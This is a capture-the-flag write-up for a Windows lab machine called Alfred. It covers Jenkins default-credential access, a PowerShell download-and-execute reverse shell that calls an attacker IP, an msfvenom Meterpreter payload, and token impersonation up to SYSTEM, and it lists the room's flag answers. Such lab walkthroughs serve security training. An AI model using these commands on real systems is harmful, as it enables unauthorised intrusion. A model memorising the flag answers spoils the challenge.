# Alfred - Easy

1. [Initial Access](#initial-access)
2. [Switching Shells](#switching-shells)
3. [Privilege Escalation](#privilege-escalation)

## Initial Access

```shell
nmap -T4 -Pn -p- -A 10.10.45.147
#since machine does not respond to ICMP

python3 -m http.server

nc -nvlp 4444
```

```markdown
After the nmap scan, we can check the website on ports 80 and 8080.

On trying default creds admin:admin in the login panel, we get access.

Now we have to execute commands on the underlying system using Jenkins.

Required PowerShell script (Nishang) - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

After setting up the Python server and listening on port 4444, we need to setup Jenkins for command execution.

Jenkins dashboard > New item > Freestyle project > Build > Execute Windows batch command > Add malicious command > Save

Required command - powershell iex (New-Object Net.WebClient).DownloadString('http://10.17.48.136:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.17.48.136 -Port 4444

After setting up listener, we have to choose the Build Now option on Jenkins dashboard to execute the command.

This gives us remote shell access; the user.txt flag can be found in bruce's Desktop.
```

```markdown
1. How many ports are open? (TCP only) - 3

2. What is the username and password for the log in panel? - admin:admin

3. What is the user.txt flag? - 79007a09481963edf2e1321abd9ae2a0
```

## Switching Shells

```shell
#generate payload using msfvenom
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.17.48.136 LPORT=6666 -f exe -o jenkins-shell.exe

python3 -m http.server

msfconsole

use exploit/multi/script/web_delivery

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 10.17.48.136

set LPORT 6666

set target PSH

run
```

```markdown
We can get a Meterpreter shell as well for the previous process.

After generating the payload, we can use the previous steps on Jenkins to run the malicious command.

Required command - powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.17.48.136:8000/jenkins-shell.exe','jenkins-shell.exe')"

We need to use metasploit tool to get the Meterpreter shell.

After runnning the metasploit command, we have to run another command in Jenkins

Required command - powershell -c Start-Process "jenkins-shell.exe"

Alternatively, we can use the exploit/multi/script/web_delivery option, which does not involve the generated payload.
```

```markdown
1. What is the final size of the exe payload that you generated? - 73802
```

## Privilege Escalation

```shell
#SeDebugPrivilege and SeImpersonatePrivilege are enabled, we can exploit this
#in remote shell
load incognito

#if previous command does not work
use incognito

list_tokens -g
#shows required token BUILTIN\Administrators

impersonate_token "BUILTIN\Administrators"

getuid

ps
#view processes
#find pid of services.exe

migrate 668

pwd

cd config

cat root.txt
```

```markdown
1. What is the output when you run the getuid command? - NT AUTHORITY\SYSTEM

2. Read the root.txt file at C:\Windows\System32\config - ��dff0f748678f280250f25a45b8046b4a
```
